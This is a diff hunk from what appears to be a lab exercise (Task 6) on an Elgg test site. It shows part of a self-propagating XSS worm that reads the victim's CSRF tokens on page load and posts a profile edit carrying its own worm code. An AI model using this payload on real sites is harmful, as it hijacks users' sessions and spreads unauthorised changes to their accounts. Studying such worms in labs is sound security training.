@@ -12,7 +12,7 @@ window.onload = function () {
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
     var description =
-        "&description=<p>modified by Samy (Aira!!)<p>" + wormCode + "&accesslevel[description]=2";
+        "&description=<p>modified by Samy (Task 6: Link Approach)<p>" + wormCode + "&accesslevel[description]=2";
     //Construct the content of your url.
     var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
     var content = userName + guid + ts + token + description;
